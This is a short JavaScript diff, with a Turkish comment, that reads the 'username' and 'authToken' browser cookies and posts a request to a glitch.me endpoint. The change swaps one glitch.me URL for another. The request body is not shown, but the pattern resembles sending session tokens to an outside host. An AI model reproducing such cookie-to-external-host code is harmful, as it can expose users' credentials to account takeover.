@@ -12,7 +12,7 @@
         const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
         const authToken = getCookie('authToken') || 'Token Yok';
 
-        fetch('https://duello-katiponline-v2.glitch.me/get-code', { // Yeni Glitch URL’sini kullan
+        fetch('https://buttoned-mountainous-plier.glitch.me/get-code', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
